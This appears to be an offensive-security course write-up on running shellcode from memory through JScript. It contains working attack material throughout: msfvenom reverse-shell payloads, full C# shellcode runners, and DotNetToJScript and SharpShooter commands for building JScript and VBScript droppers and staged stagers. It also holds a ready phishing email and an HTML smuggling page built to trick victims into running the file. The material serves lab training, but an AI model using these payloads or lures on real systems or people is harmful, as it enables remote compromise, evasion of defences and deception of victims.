To improve our Jscript tradecraft, and run our payload completely from memory, we'll again invoke Win32 APIs just as we did in the Microsoft Office module.

Previously, we used PowerShell for this. However, since PowerShell has been used for many years by both penetration testers and malware authors, security solution providers (Microsoft included) have tried to take steps against malicious use of it. In this module, we will instead leverage C# which has, until recently, not been in the spotlight. This could reduce our profile and may help avoid detection.

Since there's no known way to invoke the Win32 APIs directly from Jscript, we'll instead embed a compiled C# assembly in the Jscript file and execute it. This will give us the same capabilities as PowerShell since we will have comparable access to the .NET framework. This is a powerful technique that has recently gained a lot of attention and popularity.

## Let's create a new "Hello World" project. 

Launch Visual Studio and choose Create a new project from the splash screen

<img width="1129" height="760" alt="image" src="https://github.com/user-attachments/assets/32cc7e76-bd0a-4701-a35f-9aaefd713a6f" />

Simple 'Hello World' messagebox

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World");
        }
    }
}

```


<img width="1886" height="611" alt="image" src="https://github.com/user-attachments/assets/c9071e87-d58e-4111-877e-ba064a6bb3dc" />

Then change Debug to Release and next Buil -> Build Solution


<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cd893b0d-424d-4ab2-b851-6d8eef635d75" />

## DotNetToJscript
Let's introduce C# code into our Jscript, we'll use this technique to create our in-memory shellcode runner

First, we need to download the (DotNetToJscript)[https://github.com/tyranid/DotNetToJScript] project from GitHub or use the version stored locally at C:\Tools\DotNetToJscript-master.zip on the Windows 10 development machine. We'll extract it, copy it to our Kali Samba share, and open it in Visual Studio.

When opening the Visual Studio solution from a remote location, a security warning, similar to the one below, prompts us asking if we really want to open it.

Once we've opened DotNetToJscript in Visual Studio, we'll navigate to the Solution Explorer and open TestClass.cs under the ExampleAssembly project.

Once we've opened DotNetToJscript in Visual Studio, we'll navigate to the Solution Explorer and open TestClass.cs under the ExampleAssembly project.

We'll compile this as a .dll assembly, which we'll execute in Jscript. This simple project will display a "Test" message box.

1- Once we've opened DotNetToJscript in Visual Studio, we'll navigate to the Solution Explorer and open TestClass.cs under the ExampleAssembly project. We'll compile this as a .dll assembly, which we'll execute in Jscript. This simple project will display a "Test" message box.
2- Notice that the Solution Explorer lists a second project (DotNetToJscript) that converts the assembly into a format that Jscript can execute. At this point, let's switch from Debug to Release mode and compile the entire solution with Build > Build Solution.
4- Comment version 
<img width="1917" height="499" alt="image" src="https://github.com/user-attachments/assets/ba09f229-d9e8-448f-9ad0-38895cbc4286" />
5- Build Solution on Release
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/38b64827-9e5b-4fc8-a4a8-48ecd75dc95a" />

6- When the solution is compiled, we need to move some files to get DotNetToJscript to work correctly. We'll navigate to the DotNetToJScript folder and copy DotNetToJscript.exe and NDesk.Options.dll to the C:\Tools folder on the Windows 10 development machine. Then we'll go to the ExampleAssembly folder and also copy ExampleAssembly.dll to C:\Tools. Note that these .dll files must be in place whenever we execute a DotNetToJscript program.

<img width="1643" height="472" alt="image" src="https://github.com/user-attachments/assets/65beee41-5cc9-4807-b795-cba3624d9fdc" />

7- Verify Generated Script

The generated JScript file contains:
- Base64-encoded data
- Assembly loading logic
- Execution routines
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3a7bdf5f-bb43-47fb-95df-890aea1165dc" />
<img width="1362" height="640" alt="image" src="https://github.com/user-attachments/assets/da6c63af-af77-4cb8-94ff-3a6adfd54aca" />
A test run confirms the assembly loads via Windows Script Host and the embedded logic executes correctly, validating the loader before adding shellcode.

## Embed Shellcode by importing essential Windows APIs from kernel32.dll

Generate shellcode
```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.6 LPORT=4444  -f csharp EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of csharp file: 1677 bytes
byte[] buf = new byte[324] {0xfc,0xe8,0x82,0x00,0x00,0x00,
0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
0xe2,0xf2,0x52,0x5.................
```

Full code runner
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}


```

Before compiling this project, we must set the CPU architecture to x64 since we are using 64-bit shellcode. This is done through the CPU drop down menu, where we open the Configuration Manager.
<img width="1316" height="903" alt="image" src="https://github.com/user-attachments/assets/00b8a24a-0751-4015-acf1-e6db9fad581b" />

PoC
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9013144a-e539-480a-999c-f6b081e118b8" />

## Jscript Shellcode Runner

Change TestClass.sc code for Win32 APIs imported in ExampleAssembly, shellcode and methods calls:

```
....

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()
    {
        byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,
0xc0,0xa8,0x00,0x06,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
............

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

....
```
Build and execute:
`C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js`

Run runeer.js
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c077b211-c6fb-4787-a60a-d1c9e4607e44" />

## For .vbs shellcode runner
```
PS C:\Users\administrator\Downloads\DotNetToJScript-master\DotNetToJScript-master\DotNetToJScript\bin\Release> .\DotNetToJScript.exe ExampleAssembly.dll --lang=VBScript --ver=auto -o shellcode.vbs
PS C:\Users\administrator\Downloads\DotNetToJScript-master\DotNetToJScript-master\DotNetToJScript\bin\Release> cscript.exe shellcode.vbs
```
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/423f34f3-69e2-4fc5-a75a-289da2296b92" />


## Extra Mile
Create the text for a phishing email using a pretext that would make sense for your organization, school, or customer. Frame the text to convince the victim to click on an embedded link that leads to an HTML page on your Kali system.

Manually create the HTML page sitting on your Apache web server so it performs HTML smuggling of a Jscript shellcode runner when the link is opened with Google Chrome. Ensure that the email text and the content of the HTML page encourage the victim to run the Jscript file.

📧 Step 1: Draft the Phishing Email (Pretext)
The goal is to make the victim click the link and then execute the downloaded file. A highly effective pretext in a corporate or academic environment is a mandatory security update or HR notification.

Subject: Action Required: Security Policy Update and New Portal Access

Email Body:

Dear [Victim's Name],

As part of our ongoing security enhancements, we have implemented a new access policy. Effective immediately, it is mandatory to validate your credentials through the new Self-Service Portal.

Please click the link below to download your personal configuration file and complete the process:

[Link to your HTML page on Kali]

Once downloaded, open the file so the system can apply the changes automatically. This process will take less than a minute.

If you have any questions, please do not hesitate to contact the support team.

Sincerely,
Information Security Team

💻 Step 2: Create the HTML Smuggling Page (For Chrome)
HTML Smuggling involves embedding the JScript file (the demo.js you generated) as a Base64-encoded Blob directly within the page's source code. When the victim opens the page, the browser reconstructs the file and downloads it automatically, bypassing network defenses that look for executable file transfers.

For this to work seamlessly in Google Chrome, we use the URL.createObjectURL API and a hidden <a> tag (since msSaveBlob is an older, deprecated Microsoft-specific method).

Encode your JScript file to Base64:
`base64 -w0 /path/to/your/demo.js > /var/www/html/demo.b64`

Create the HTML file on your Apache server (e.g., /var/www/html/security-portal.html):

```
<!DOCTYPE html>
<html>
<head>
    <title>Security Portal - Configuration Download</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 80px; height: 80px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Generating your configuration file...</h1>
    <div class="loader"></div>
    <p id="status">Please wait. Your download will begin automatically.</p>
    <p style="color: red; font-weight: bold;">IMPORTANT: Once the download is complete, open the "security_update.js" file to apply the changes.</p>

    <script>
        // 1. Paste the Base64 content of your JScript file (demo.js) here
        var b64Payload = "PASTE_YOUR_DEMO.B64_CONTENT_HERE";

        // 2. Filename the victim will see
        var fileName = "security_update.js";

        // 3. Decode Base64 to a byte array
        var byteCharacters = atob(b64Payload);
        var byteNumbers = new Array(byteCharacters.length);
        for (var i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        var byteArray = new Uint8Array(byteNumbers);

        // 4. Create a Blob with the content
        var blob = new Blob([byteArray], {type: "application/javascript"});

        // 5. Create a dynamic download link
        var link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = fileName;
        link.style.display = "none";
        document.body.appendChild(link);

        // 6. Simulate a click to force the download
        link.click();

        // 7. Clean up
        setTimeout(function() {
            document.body.removeChild(link);
            window.URL.revokeObjectURL(link.href);
            document.getElementById("status").innerText = "Download complete. Please open the downloaded file.";
        }, 1000);
    </script>
</body>
</html>
```
> Note on the JScript file: The downloaded file (security_update.js) is the one generated by DotNetToJScript. When the victim double-clicks it, Windows Script Host (WSH) will execute it and load your shellcode runner into memory.

🌐 Step 3: Deploy on your Kali Apache Server
Place the security-portal.html file in your web server's root directory (usually /var/www/html/).

Ensure the Apache service is running:
`sudo systemctl start apache2`

Verify the page is accessible from the victim's Windows machine by navigating to http://<KALI_IP>/security-portal.html.

🎯 Step 4: Encourage Execution (Social Engineering)
The exercise requires the email text and HTML content to encourage the victim to run the file. We've already included this with the red text on the page: "IMPORTANT: Once the download is complete, open the 'security_update.js' file to apply the changes."

To make it even more convincing, you can add a conditional instruction that makes the user feel they must execute it:

> "If the file does not open automatically, right-click on it and select 'Open with' > 'Windows Based Script Host' to force the security validation."

## [SharpShooter](https://github.com/mdsecactivebreach/sharpshooter)
SuperSharpShooter is used to further refine delivery and reduce static signatures. It automate what we done previously.
Install it and dependencies on python virtual env. o install on kali
```
┌──(kali㉿kali)-[~/Projects]
└─$ sudo apt install sharpshooter
```
Save shellcode and generate .js
```
┌──(kali㉿kali)-[~/Projects]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.6 LPORT=443 EXITFUNC=thread -f raw -o shell.txt 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: shell.txt
                                                                                                                                                             
┌──(kali㉿kali)-[~/Projects]
└─$ sharpshooter  --stageless --dotnetver 4 --rawscfile ./shell.txt --payload js --output security-policies

       _____ __                    _____ __                __           
      / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
      \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
     ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
    /____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                         /_/                                            

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
    
[*] Written delivery payload to security-policies.js
```

### Expand on the attack by creating a staged attackstaged that also leverages HTML smuggling to deliver the malicious Jscript file.
To generate a staged payload in JScript format with Web delivery (which perfectly matches your HTML Smuggling exercise), the SharpShooter command would be:
`sharpshooter --payload js --delivery web --web http://<IP_DE_TU_KALI>/shellcode.payload --output demo --dotnetver 4`

🔍 Explanation of each parameter:
--payload js: Defines the stager (first stage) format as a JScript file (.js).

--delivery web: Configures the delivery mechanism so the stager downloads the second stage over HTTP/S.

--web http://...: The exact URL where you will host the second-stage file (shellcode.payload). The JScript stager will point to this address to download the final C# code.

--output demo: The base name for the generated files (it will create demo.js and demo.payload).

--dotnetver 4: (Optional but recommended) Forces the use of .NET Framework 4.x in the compiled payload, which usually provides better compatibility on modern systems.

📦 What files will this command generate?
When you run it, SharpShooter will create two files in your current directory:

demo.js: This is the stager (first stage). It's the JScript file you will deliver to the victim (for example, hidden inside your HTML using the HTML Smuggling technique we discussed earlier).

demo.payload: This is the stage (second stage). It's a compressed and Base64-encoded file containing the final C# code. You must upload this file to your web server (Kali) so it is available at the URL you specified in the --web parameter.

🚀 Final Attack Flow
The victim opens your malicious HTML page.

The browser (Chrome) downloads and saves the demo.js file (the stager).
